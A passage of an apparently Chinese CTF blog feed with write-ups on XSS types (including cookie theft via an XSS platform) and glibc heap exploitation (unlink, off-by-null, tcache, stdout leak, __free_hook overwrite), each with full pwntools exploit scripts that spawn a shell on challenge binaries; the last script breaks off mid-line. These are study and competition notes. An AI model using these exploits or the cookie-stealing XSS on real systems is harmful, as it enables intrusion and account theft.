代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。<br>发包 x=xiaodi =&gt; x.php =&gt; 写道数据库某个表 =&gt; x.php =&gt;回显</p></li><li><p>DOM型<br>基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。<br>发包 x=xiaodi =&gt; 本地浏览器静态前端代码 =x.php</p><p> ‘ onclick=”alert(2)”&gt;</p></li></ol><p><img src="https://s2.loli.net/2022/03/20/sVX35oTxpwF6vDR.png"></p><p>利用xss平台可以盗取cookie</p><p><a href="https://xssaq.com/xss.php?do=project&amp;act=viewcode&amp;ty=create&amp;id=12491">https://xssaq.com/xss.php?do=project&amp;act=viewcode&amp;ty=create&amp;id=12491</a></p><p>也可以通过向自己搭建的网站发送cookie</p><p>上传代码<br><img src="https://s2.loli.net/2022/03/20/VKsu9ZW2fzeotgj.png"></p><p>本地网站<br><img src="https://s2.loli.net/2022/03/20/7NqSFuhBUlTYswJ.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XSS-跨站漏洞&quot;&gt;&lt;a href=&quot;#XSS-跨站漏洞&quot; class=&quot;headerlink&quot; title=&quot;XSS 跨站漏洞&quot;&gt;&lt;/a&gt;XSS 跨站漏洞&lt;/h1&gt;&lt;h2 id=&quot;XSS简介&quot;&gt;&lt;a href=&quot;#XSS简介&quot; class=&quot;headerlink</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>unlink</title>
    <link href="http://example.com/2022/01/23/unlink/"/>
    <id>http://example.com/2022/01/23/unlink/</id>
    <published>2022-01-23T13:50:01.673Z</published>
    <updated>2022-01-23T14:33:30.285Z</updated>
    
    <content type="html"><![CDATA[<p>今天复习一下unlink的原理及触发方式，这里主要2.29之前的方法，之后的利用写在off_by_none中。</p><p>unlink在合并堆块时，会将被合并的堆块从bin链中取出之后的链将变成FD-&gt;bk = BK ; BK-&gt;fd = FD , 可以利用这种机制在特定的地址处写入堆块（需要满足FD-&gt;bk == p ; BK-&gt;fd ==p）</p><p>以2014 HITCON stkof作为例题演示</p><p>在edit中写入的size是可控的，所以存在溢出漏洞</p><p><img src="https://s2.loli.net/2022/01/23/AHMIYEC2BWszcJy.png"></p><p>可以发现chunk的地址被存储在了这个地址head，可以通过伪造chunk及其fd,bk从而将chunk写入该位置。</p><p>申请三个堆，用于unlink的堆块不可进入fastbin否则无法触发unlink</p><p><img src="https://s2.loli.net/2022/01/23/smhTbauCo85MdlS.png"></p><p>伪造fackchunk 其fd = head-0x8 ; bk = head,注意其下一chunk的prevsize 和 inuse都需要修改使其认为fakechunk是其上一chunk.</p><p>free造成unlink,FD-bk = BK ; BK-&gt;fd = FD (如图)</p><p><img src="https://s2.loli.net/2022/01/23/Ai7fJtnVmdIMpKR.png"></p><pre><code>ad(0x20)ad(0x30)ad(0x80) #must be smallbinhead = 0x0602140payload = p64(0) + p64(0x20) + p64(head - 0x8) + p64(head) + p64(0) + p64(0) + p64(0x30) + p64(0x90) # make it believe that prev chunk is at fakechunkmd(2,len(payload),payload)#gdb.attach(io)rm(3)</code></pre><p>之后可以通过编辑chunk2来leak.将free_got , puts_got , atoi_got 分别填入chunk中，再次编辑将free_got中写入puts_plt，这样调用free可以泄露地址。</p><p><img src="https://s2.loli.net/2022/01/23/E1lDqKQ53wtRxW8.png"></p><pre><code>payload = b&#39;a&#39; * 8 + p64(elf.got[&#39;free&#39;]) + p64(elf.got[&#39;puts&#39;]) + p64(elf.got[&#39;atoi&#39;])md(2,len(payload),payload)#gdb.attach(io)payload = p64(elf.plt[&#39;puts&#39;])md(0,len(payload),payload)rm(1)puts_addr = io.recvuntil(&#39;\nOK\n&#39;, drop=True).ljust(8, b&#39;\x00&#39;)puts_addr = u64(puts_addr)log.success(&#39;puts addr: &#39; + hex(puts_addr))base = puts_addr - libc.sym[&#39;puts&#39;]binsh = base + libc.search(b&quot;/bin/sh&quot;).__next__()system = base + libc.sym[&#39;system&#39;]</code></pre><p>最后想atoi_got中写入system,传入bin_sh的参数即可getshell</p><pre><code>li(&quot;system---&gt;&quot;+hex(system))md(2,len(p64(system)),p64(system))io.sendline(p64(binsh))</code></pre><p>完整exp如下：</p><pre><code>#! /usr/bin/python3#-*- coding:utf-8 -*-from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)#------------------------------------------------io = process(&#39;./stkof&#39;)context.log_level=&#39;debug&#39;elf = ELF(&#39;./stkof&#39;)libc = elf.libccontext.log_level = &#39;debug&#39;#------------------------------------------------def ad(size):    io.sendline(&#39;1&#39;)    io.sendline(str(size))    io.recvuntil(&#39;OK\n&#39;)def md(idx, size, content):    io.sendline(&#39;2&#39;)    io.sendline(str(idx))    io.sendline(str(size))    io.send(content)    io.recvuntil(&#39;OK\n&#39;)def rm(idx):    io.sendline(&#39;3&#39;)    io.sendline(str(idx))def finish():    io.interactive()def exploit():    ad(0x20)    ad(0x30)    ad(0x80) #must be smallbin    head = 0x0602140    payload = p64(0) + p64(0x20) + p64(head - 0x8) + p64(head) + p64(0) + p64(0) + p64(0x30) + p64(0x90) # make it believe that prev chunk is at fakechunk    md(2,len(payload),payload)    rm(3)    gdb.attach(io)    io.recvuntil(&#39;OK\n&#39;)    payload = b&#39;a&#39; * 8 + p64(elf.got[&#39;free&#39;]) + p64(elf.got[&#39;puts&#39;]) + p64(elf.got[&#39;atoi&#39;])    md(2,len(payload),payload)    #gdb.attach(io)    payload = p64(elf.plt[&#39;puts&#39;])    md(0,len(payload),payload)    rm(1)    puts_addr = io.recvuntil(&#39;\nOK\n&#39;, drop=True).ljust(8, b&#39;\x00&#39;)    puts_addr = u64(puts_addr)    log.success(&#39;puts addr: &#39; + hex(puts_addr))    base = puts_addr - libc.sym[&#39;puts&#39;]    binsh = base + libc.search(b&quot;/bin/sh&quot;).__next__()    system = base + libc.sym[&#39;system&#39;]    li(&quot;system---&gt;&quot;+hex(system))    md(2,len(p64(system)),p64(system))    io.sendline(p64(binsh))#-------------------------------startif __name__ == &#39;__main__&#39;:    exploit()    finish()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天复习一下unlink的原理及触发方式，这里主要2.29之前的方法，之后的利用写在off_by_none中。&lt;/p&gt;
&lt;p&gt;unlink在合并堆块时，会将被合并的堆块从bin链中取出之后的链将变成FD-&amp;gt;bk = BK ; BK-&amp;gt;fd = FD , 可以利用</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>off_by_none_2.31</title>
    <link href="http://example.com/2022/01/16/off_by_none_2.31/"/>
    <id>http://example.com/2022/01/16/off_by_none_2.31/</id>
    <published>2022-01-16T02:28:49.627Z</published>
    <updated>2022-01-16T03:44:40.898Z</updated>
    
    <content type="html"><![CDATA[<p>在2.29的版本后加入了这样的防护</p><pre><code>  if (__glibc_unlikely (chunksize(p) != prevsize))    malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);</code></pre><p>/* consolidate backward */<br>    if (!prev_inuse(p)) {<br>      prevsize = prev_size (p);<br>      size += prevsize;<br>      p = chunk_at_offset(p, -((long) prevsize));<br>      if (__glibc_unlikely (chunksize(p) != prevsize))<br>        malloc_printerr (“corrupted size vs. prev_size while consolidating”);<br>      unlink_chunk (av, p);<br>    }</p><pre><code>// fd bkif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</code></pre><p>也就是说上一chunk的size必须要与该chunk的prevsize一致并且还要通过unlink的检测。</p><p>所以fake_chunk必须可以控制其size,fd,bk使其 FD-&gt;bk == p ; BK-&gt;fd == p 。 之后通过溢出修改某一chunk(D)的prevsize和inuse位为\x00 ，此时free(D)与p 形成合并，p与其FD,BK进行unlink操作。即可形成overloap</p><p><img src="https://s2.loli.net/2022/01/16/nQgS4yhpcwZKD7e.png"></p><p>以Balsn_CTF_2019-PlainText举例：</p><pre><code>   for i in range(16):      add(0x10,&#39;fill&#39;)   for i in range(16):      add(0x60,&#39;fill&#39;)   for i in range(9):      add(0x70,&#39;fill&#39;)   for i in range(5):      add(0xC0,&#39;fill&#39;)   for i in range(2):      add(0xE0,&#39;fill&#39;)   add(0x170,&#39;fill&#39;)   add(0x190,&#39;fill&#39;)# 49   add(0xa9D0,&#39;addralign&#39;) # 50</code></pre><h2 id="1-准备"><a href="#1-准备" class="headerlink" title="1.准备"></a>1.准备</h2><p>如果bin里有堆，最好把他申请出来，然后申请到合适的chunk大小使得下一chunk的地址的后16位为\x00 (实际远程时无法控制低4位的大小，需要进行爆破，有1/16的概率)</p><p><img src="https://s2.loli.net/2022/01/16/H9JQZ64UxNY5DK1.png"></p><h2 id="2-布局"><a href="#2-布局" class="headerlink" title="2.布局"></a>2.布局</h2><pre><code>   add(0x28,p64(0) + p64(0x241) + b&#39;\x28&#39;) # 53 fd-&gt;bk : 0xA0 - 0x18   add(0x28,&#39;pass-loss control&#39;) # 54   add(0xF8,&#39;pass&#39;) # 55   add(0x28,&#39;pass&#39;) # 56   add(0x28,&#39;pass&#39;) # 57   add(0x28,&#39;pass&#39;) # 58   add(0x28,&#39;pass&#39;) # 59   add(0x28,&#39;pass-loss control&#39;) # 60   add(0x4F8,&#39;to be off-by-null&#39;) # 61  0250</code></pre><p>其中\x28是p-&gt;fd , 0x241是p(fake_chunk的size)之后也会以这个大小与 chunk61 来合并.</p><h2 id="3-修复fd"><a href="#3-修复fd" class="headerlink" title="3.修复fd"></a>3.修复fd</h2><p>此时BK-&gt;fd还没有修复好，为了在修复的同时不破坏掉size，需要把它放入fastbin.同时为了利用地址信息需要把 B , C , A 依次free掉</p><p><img src="https://s2.loli.net/2022/01/16/EUSDhnVw4gTo8KI.png"></p><p>所以，需要先将Tcache 填满 ， 然后依次 free chunk B C A ，清空Tcache ，申请回chunk(A)，复写fd,使其指向p (BK-fd构造完成)</p><p>然后由于 Tcache 的 stash 机制，chunk B C 进入 Tcache，再申请回来的就是 chunk B，部分覆写使 fd 指向 fake_chunk。(FD-&gt;bk构造完成)</p><pre><code>   for i in range(7):      add(0x28,&#39;tcache&#39;)   for i in range(7):      delete(61 + 1 + i)   delete(54)     #b  0040   delete(60)     #c  0230   delete(53)     #a  0000   #a-&gt;c-&gt;b   for i in range(7):      add(0x28,&#39;tcache&#39;)# 53,54,60,62,63,64,65   add(0x28,&#39;\x10&#39;) # 53-&gt;66  a## stashed ##   add(0x28,&#39;\x10&#39;) # 54-&gt;67  b   add(0x28,b&#39;a&#39; * 0x20 + p64(0x240)) # 60-&gt;68  c   0220   gdb.attach(io)   delete(61)  #d</code></pre><h2 id="4-泄露"><a href="#4-泄露" class="headerlink" title="4.泄露"></a>4.泄露</h2><p>delete(61)  #d 后形成了overloap</p><p>利用堆重叠进行泄露</p><pre><code>add(0x140,&#39;pass&#39;) # 61show(56)libc_base = u64(sh.recv(6).ljust(0x8,&#39;\x00&#39;)) - libc.sym[&quot;__malloc_hook&quot;] - 0x10 - 0x60log.success(&quot;libc_base:&quot; + hex(libc_base))__free_hook_addr = libc_base + libc.sym[&quot;__free_hook&quot;]add(0x28,&#39;pass&#39;) # 69&lt;-56add(0x28,&#39;pass&#39;) # 70&lt;-57delete(70)delete(69)show(56)heap_base = u64(sh.recv(6).ljust(0x8,&#39;\x00&#39;)) - 0x1A0log.success(&quot;heap_base:&quot; + hex(heap_base))</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在2.29的版本后加入了这样的防护&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  if (__glibc_unlikely (chunksize(p) != prevsize))
    malloc_printerr (&amp;quot;corrupted size vs. prev_si</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>1.12电信杯</title>
    <link href="http://example.com/2022/01/13/1.12%E7%94%B5%E4%BF%A1%E6%9D%AF/"/>
    <id>http://example.com/2022/01/13/1.12%E7%94%B5%E4%BF%A1%E6%9D%AF/</id>
    <published>2022-01-13T08:47:52.315Z</published>
    <updated>2022-01-16T04:02:24.328Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p><img src="https://s2.loli.net/2022/01/13/HBngCYcTMOr8xF4.png"></p><p>因为用gets,可以看出这里存在溢出漏洞</p><p>可以通过溢出修改size,再free掉，形成overloap</p><pre><code>for i in range(10):   ad(&#39;/bin/sh\x00&#39;)rm(0)ad(b&#39;\x00&#39;*0x88+p64(0x90*8+1))    #tcache&lt;0x400  unsortbin&gt;0x400rm(1)ad(&#39;a&#39;)dp(2)leak = u64(io.recvuntil(&quot;\x7f&quot;)[-6:]+b&#39;\x00\x00&#39;)base = leak-96-0x10-libc.sym[&#39;__malloc_hook&#39;]system = base + libc.sym[&#39;system&#39;]free = base + libc.sym[&#39;__free_hook&#39;]print(&quot;leak---&gt;&quot;+hex(leak))print(&quot;free---&gt;&quot;+hex(free))print(&quot;system-&gt;&quot;+hex(system))</code></pre><p>利用tcache，溢出修改fd从而打free_hook</p><pre><code>rm(6)rm(5)rm(4)ad(b&#39;\x00&#39;*0x88 + p64(0x91) + p64(free))#gdb.attach(io)ad(p64(system))ad(p64(system))rm(8)</code></pre><p>exp:<br>    #!/usr/bin/env python3<br>    #-<em>- coding:utf-8 -</em>-<br>    from pwn import *<br>    import os<br>    r   =  lambda x : io.recv(x)<br>    ra  =  lambda   : io.recvall()<br>    rl  =  lambda   : io.recvline(keepends = True)<br>    ru  =  lambda x : io.recvuntil(x, drop = True)<br>    s   =  lambda x : io.send(x)<br>    sl  =  lambda x : io.sendline(x)<br>    sa  =  lambda x, y : io.sendafter(x, y)<br>    sla =  lambda x, y : io.sendlineafter(x, y)<br>    ia  =  lambda : io.interactive()<br>    c   =  lambda : io.close()<br>    li    = lambda x : log.info(‘\x1b[01;38;5;214m’ + x + ‘\x1b[0m’)</p><pre><code>#------------------------------------------------io = process(&#39;./pwn1&#39;)context.log_level=&#39;debug&#39;elf = ELF(&#39;./pwn1&#39;)libc = ELF(&quot;./libc-2.31.so&quot;)#------------------------------------------------def ad(con):    sla(&quot;&gt;&gt; &quot;,&#39;1&#39;)    sla(&quot;content: &quot;,con)def rm(idx):    sla(&quot;&gt;&gt; &quot;,&#39;2&#39;)    sla(&quot;index: &quot;,str(idx))def md(sz, na):    sla(&#39;&gt;&gt; &#39;, &#39;4&#39;)    sla(&#39;size of it&#39;, str(sz))    sla(&#39;name&#39;, na)def dp(idx):    sla(&quot;&gt;&gt; &quot;,&#39;3&#39;)    sla(&#39;index: &#39;, str(idx))def finish():    ia()    c()def exploit():    li(&#39;exploit...&#39;)    for i in range(10):       ad(&#39;/bin/sh\x00&#39;)    rm(0)    ad(b&#39;\x00&#39;*0x88+p64(0x90*8+1))    #tcache&lt;0x400  unsortbin&gt;0x400    rm(1)    ad(&#39;a&#39;)    dp(2)    leak = u64(io.recvuntil(&quot;\x7f&quot;)[-6:]+b&#39;\x00\x00&#39;)    base = leak-96-0x10-libc.sym[&#39;__malloc_hook&#39;]    system = base + libc.sym[&#39;system&#39;]    free = base + libc.sym[&#39;__free_hook&#39;]    print(&quot;leak---&gt;&quot;+hex(leak))    print(&quot;free---&gt;&quot;+hex(free))    print(&quot;system-&gt;&quot;+hex(system))    #gdb.attach(io)    rm(6)    rm(5)    rm(4)    ad(b&#39;\x00&#39;*0x88 + p64(0x91) + p64(free))    #gdb.attach(io)    ad(p64(system))    ad(p64(system))    rm(8)#-------------------------------startif __name__ == &#39;__main__&#39;:    exploit()    finish()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn1&quot;&gt;&lt;a href=&quot;#pwn1&quot; class=&quot;headerlink&quot; title=&quot;pwn1&quot;&gt;&lt;/a&gt;pwn1&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/01/13/HBngCYcTMOr8xF4.png&quot;&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>1.10长安抗疫赛</title>
    <link href="http://example.com/2022/01/11/1.10%E9%95%BF%E5%AE%89%E6%8A%97%E7%96%AB%E8%B5%9B/"/>
    <id>http://example.com/2022/01/11/1.10%E9%95%BF%E5%AE%89%E6%8A%97%E7%96%AB%E8%B5%9B/</id>
    <published>2022-01-11T14:55:55.632Z</published>
    <updated>2022-01-11T15:34:55.469Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p>明显的栈溢出漏洞</p><p><img src="https://s2.loli.net/2022/01/11/2umJ7kyoaPEqTY6.png"></p><p>leave 是 </p><p>mov esp,ebp<br>pop ebp </p><p>发现直接覆盖ret竟然不行，观察汇编发现在跳转前先将lea esp, [ecx-4]</p><p><img src="https://s2.loli.net/2022/01/11/QhXTxcqOJlWfviH.png"></p><p>因此需要先控制ecx,可以向[ebp - 4]写入想要跳转的地址（该栈上），再在此地址写入后门函数（esp, [ecx - 4]）的地址即可实现getshell。</p><p><img src="https://s2.loli.net/2022/01/11/5pNdDZ38Q4Bwsha.png"></p><h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><p><img src="https://s2.loli.net/2022/01/11/QZCX1uoOlDqpkf5.png"></p><p>如上图，存在off_by_one漏洞，可以利用堆重叠进行任意地址写的操作。</p><p>首先，泄露libc地址： 将unsortbin切割，通过残留的fd指针，从而泄露出地址。</p><p>其次，利用堆重叠，将一号堆溢出值二号堆的fd处，</p><p><img src="https://s2.loli.net/2022/01/11/TsUYFW9qiCrSkIl.png"></p><p>若写入的是__free_hook的地址即可实现劫持free的效果。此时向__free_hook处写入system，在__free_hook-8处写入参数”/bin/sh\x00”,再free该堆即可<br>（也可向任意的堆头处写入”/bin/sh\x00”，第一个位置将作为参数传入）</p><p><img src="https://s2.loli.net/2022/01/11/JZnAaWq9rjlLEM4.png"></p><pre><code>#!/usr/bin/python3from pwn import *context.log_level = &#39;debug&#39;elf = ELF(&#39;./pwn2&#39;)p = process(&quot;./pwn2&quot;)libc = ELF(&quot;/glibc/2.27/64/lib/libc.so.6&quot;)s      = lambda buf        : p.send(buf)sl     = lambda buf        : p.sendline(buf)sa     = lambda delim, buf : p.sendafter(delim, buf)sal    = lambda delim, buf : p.sendlineafter(delim, buf)sh     = lambda            : p.interactive()r      = lambda n=None     : p.recv(n)ru     = lambda delim      : p.recvuntil(delim)r7f    = lambda            : u64(p.recvuntil(&quot;\x7f&quot;)[-6:]+b&quot;\x00\x00&quot;)trs    = lambda addr       : libc.address+addrgadget = lambda ins        : libc.search(asm(ins,arch=&quot;amd64&quot;)).next()tohex  = lambda buf        : &quot;&quot;.join(&quot;\\x%02x&quot;%ord(_) for _ in buf)def add(size,content):    sal(&quot;Choice: &quot;,&quot;1&quot;)    sal(&quot;size: &quot;,str(size))    sal(&quot;content: &quot;,content)def free(id):    sal(&quot;Choice: &quot;,&quot;3&quot;)    sal(&quot;idx: &quot;,str(id))def edit(id,content):    sal(&quot;Choice: &quot;,&quot;2&quot;)    sal(&quot;idx: &quot;,str(id))    sa(&quot;content: &quot;,content)def show(id):    sal(&quot;Choice: &quot;,&quot;4&quot;)    sal(&quot;idx: &quot;,str(id))for i in range(8):   add(0x88,&#39;aaaaaaaa&#39;)add(0x88,&#39;bbbbbbbb&#39;)for i in range(8):   free(i)#gdb.attach(p)add(0x28,&#39;a&#39;*8)edit(0,&#39;a&#39;*9)show(0)leak = u64(p.recvuntil(&#39;\x7f&#39;)[-6:] + b&#39;\x00\x00&#39;)      #u64(p.recvuntil(&quot;\x7f&quot;)[-6:] + b&quot;\x00\x00&quot;)base = leak-0xa-279-0x10-libc.sym[&#39;__malloc_hook&#39;]system = base+libc.sym[&#39;system&#39;]free_hook = base+libc.sym[&#39;__free_hook&#39;]print(&quot;leak----&gt;&quot;+hex(leak))print(&quot;base----&gt;&quot;+hex(base))print(&quot;free_hook--&gt;&quot;+hex(free_hook))#gdb.attach(p)add(0x18,&#39;AAAA&#39;)  #1add(0x18,&#39;BBBB&#39;)  #2add(0x18,&#39;CCCC&#39;)  #3add(0x18,&#39;DDDD&#39;)  #4free(1)add(0x18,&quot;A&quot;*0x18+&quot;\x41&quot;)free(3)free(2)add(0x38,&#39;EEEEE&#39;)payload = b&#39;a&#39;*0x18 + p64(0x21) + p64(free_hook-8)edit(2,payload)#gdb.attach(p)add(0x18,b&quot;/bin/sh\x00&quot;)  #3#gdb.attach(p)add(0x18,b&quot;/bin/sh\x00&quot; + p64(system))  #5show(3)free(3)#free(5)p.interactive()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn1&quot;&gt;&lt;a href=&quot;#pwn1&quot; class=&quot;headerlink&quot; title=&quot;pwn1&quot;&gt;&lt;/a&gt;pwn1&lt;/h1&gt;&lt;p&gt;明显的栈溢出漏洞&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/01/11/2umJ7</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十一月十五日-stdout爆破</title>
    <link href="http://example.com/2021/11/15/11.15_stdout%E7%88%86%E7%A0%B4/"/>
    <id>http://example.com/2021/11/15/11.15_stdout%E7%88%86%E7%A0%B4/</id>
    <published>2021-11-15T15:05:18.146Z</published>
    <updated>2021-11-15T17:30:17.346Z</updated>
    
    <content type="html"><![CDATA[<h1 id="stdout爆破"><a href="#stdout爆破" class="headerlink" title="stdout爆破"></a>stdout爆破</h1><p>最近做的比赛有一道没有给出show函数，所以学习了一下stdout爆破来泄露函数地址。</p><p>1.通过uaf漏洞修改fd ，指向我们提前布置好的fake_chunk。</p><p>2.利用fake_chunk修改下一chunk的size,从而可以free其下一个chunk而进入unsortbin，从而获得main_area.</p><p>3.再次利用uaf漏洞，修改unsort_chunk的低2字节，由于最后3位是确定的，所以需要爆破一位。至于错位构造size域，我们需要自行查找。</p><p>4.最后连续add两次即可将chunk分配至目标位置，覆盖stdout及其后几位即可实现泄露。</p><pre><code>new(0x10,0,p64(0) + p64(0x41))new(0x60,1,p64(0)*5 + p64(0x41))new(0x30,2,&#39;a&#39;)new(0x30,3,&#39;b&#39;)new(0x30,4,&#39;c&#39;)</code></pre><p>add出所需要的chunk , 分配0x10 是为了方便放置fake_chunk 从而修改下一chunk的size，分配0x60是因为目标地址数据以0x7f开头，方便构造size域 。</p><pre><code>edit(3,p8(0x10))new(0x30,3,p8(0x10))new(0x30,2,p64(0)+p64(0x70+0x41))                #make chunk overloap</code></pre><p><img src="https://i.loli.net/2021/11/15/cJa9RmET7qykd2w.gif"></p><p><img src="https://i.loli.net/2021/11/15/YhjDvoRKSbyrxQf.gif"></p><p><img src="https://i.loli.net/2021/11/15/xD98gkQBqCPR4ns.gif"></p><p>利用uaf漏洞修改fd指向fake_chunk，将chunk分配至fake_chunk处，并且利用fake_chunk修改下一chunk的size域。</p><pre><code>free(1)                          #make unsortbin  &amp;&amp; double freeedit(2,p64(0)+p64(0x71))         #repire chunkedit(1,p16(0x2620-0x43))</code></pre><p><img src="https://i.loli.net/2021/11/15/TLXBc36GHosbyUF.gif"></p><p>free该chunk，使其进入unsortbin ,其fd指向main_area 。利用fake_chunk修复该chunk。并且利用uaf漏洞修改unsort_chunk的fd指向目标位置。这里需要爆破一位数也就是1/16的概率。查看stdout可以使用 打印  “p /x _IO_2_1_stdout_”</p><pre><code>new(0x60,1,p16(0x2620-0x43))new(0x60,5,&quot;a&quot;*0x33+p64(0xfbad1887)+p64(0)*3+p8(0))</code></pre><p><img src="https://i.loli.net/2021/11/15/g5XKxmhiju7OJc3.png"><br>    p /x _IO_2_1_stdout_</p><p><img src="https://i.loli.net/2021/11/15/YboxiIdqlVjNJ9f.png"></p><p>连续malloc两次，从而实现地址泄露</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;stdout爆破&quot;&gt;&lt;a href=&quot;#stdout爆破&quot; class=&quot;headerlink&quot; title=&quot;stdout爆破&quot;&gt;&lt;/a&gt;stdout爆破&lt;/h1&gt;&lt;p&gt;最近做的比赛有一道没有给出show函数，所以学习了一下stdout爆破来泄露函数地址。&lt;/p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十一月六日-CTF-PWN</title>
    <link href="http://example.com/2021/11/06/%E4%B8%9C%E5%8D%8E%E6%9D%AF11.6/"/>
    <id>http://example.com/2021/11/06/%E4%B8%9C%E5%8D%8E%E6%9D%AF11.6/</id>
    <published>2021-11-05T16:57:36.771Z</published>
    <updated>2021-11-15T17:34:25.171Z</updated>
    
    <content type="html"><![CDATA[<p>最近打东华杯，因为看不懂c++，所以遭重了。花了一点时间学习C++的反汇编，终于把它拿捏了。</p><h1 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h1><p>UAF漏洞，在rm函数中，并没有将指针设置为0.所以我们可以将某个chunk free 后然后直接利用md函数修改其fd指针，从而进行unsortbin_attack</p><p>add(0),free(0)后可以直接利用未消除的指针进行泄露地址</p><p>这里可以选择覆盖tcache_str为大数，下下次分配chunk时将直接进入unsortbin。<br><strong><em>这里需要格外注意的是，这里并未直接将改tcache_num设置为7 ，而是利用tcache和unsortbin的指针指向相差了0x10，因此被分配到最高地址的chunk被free时将会进入unsortbin，而其上一个被free的chunk仍进入tchche这为之后修改tchche的fd提供了方便</em></strong></p><p>第一次free:</p><p><img src="https://i.loli.net/2021/11/07/AuBT9yV2rQLozR7.png"></p><p>第二次free:</p><p><img src="https://i.loli.net/2021/11/07/CLGoyrjsJ9pPKRO.png"></p><p>也是因为未清除指针的原因，可以直接读出fd的值然后计算出__free_hook</p><p>覆盖tcache的fd为__free_hook，然后连续malloc两个chunk,free掉有“/bin/sh\x00”的chunk</p><pre><code>#! /usr/bin/python3from pwn import*io = process(&#39;./cpp2&#39;)elf = ELF(&quot;./cpp2&quot;)libc = ELF(&#39;./libc-2.31.so&#39;)r   =  lambda x : io.recv(x)rx  =  lambda x: io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)def ad(idx,size): sla(&#39;&gt;&gt;&#39;,str(1)) sla(&#39;I:&gt;&gt;&#39;,str(idx)) sla(&#39;S:&gt;&gt;&#39;,str(size))def md(idx,con): sla(&#39;&gt;&gt;&#39;,str(2)) sla(&#39;I:&gt;&gt;&#39;,str(idx)) sla(&#39;V:&gt;&gt;&#39;,con)def rm(idx): sla(&#39;&gt;&gt;&#39;,str(4)) sla(&#39;I:&gt;&gt;&#39;,str(idx))def dp(idx): sla(&#39;&gt;&gt;&#39;,str(3)) sla(&#39;I:&gt;&gt;&#39;,str(idx))ad(0,0x67)ad(1,0x67)ad(2,0x67)ad(3,0x67)rm(0)rm(1)dp(1)io.recvuntil(&#39;\n&#39;)heap = u64(io.recv(6).ljust(8,b&#39;\x00&#39;)) - 0x12EC0 + 0x10print(&quot;heap-----&gt;&quot;+hex(heap))md(1,p64(heap))ad(4,0x67)ad(5,0x67)md(5,b&#39;\x00&#39;*0x48+b&#39;\x00&#39;*6+b&#39;\x07&#39;)#md(5,b&#39;\x00&#39;*10 + b&#39;\x07&#39;)rm(3)rm(5)dp(5)leak = u64(io.recvuntil(&#39;\x7f&#39;)[-6:] + b&#39;\x00\x00&#39;)free = leak - 96 - 0x10 - libc.sym[&#39;__malloc_hook&#39;] + libc.sym[&#39;__free_hook&#39;]system = leak - 96 - 0x10 - libc.sym[&#39;__malloc_hook&#39;] + libc.sym[&#39;system&#39;]print(hex(leak))print(hex(free))md(3,p64(free))ad(6,0x67)md(6,b&#39;/bin/sh\x00&#39;)ad(7,0x67)md(7,p64(system))rm(6)#gdb.attach(io)io.interactive()</code></pre><h1 id="CPP2"><a href="#CPP2" class="headerlink" title="CPP2"></a>CPP2</h1><p>堆溢出漏洞</p><p>填充tcache至满，再次free进入unsorbin,截取泄露libc.</p><p>通过堆溢出漏洞修改tcache fd,进行unsortbin_attack.</p><pre><code>#! /usr/bin/python3from pwn import *sh = process(&#39;./cpp&#39;)elf = ELF(&#39;./cpp&#39;)libc = ELF(&#39;./libc-2.31.so&#39;)def ad(idx, size):    sh.sendlineafter(&quot;&gt;&gt;\n&quot;, &#39;1&#39;)    sh.sendlineafter(&quot;I:&gt;&gt;\n&quot;, str(idx))    sh.sendlineafter(&quot;S:&gt;&gt;\n&quot;, str(size))def md(idx, content):    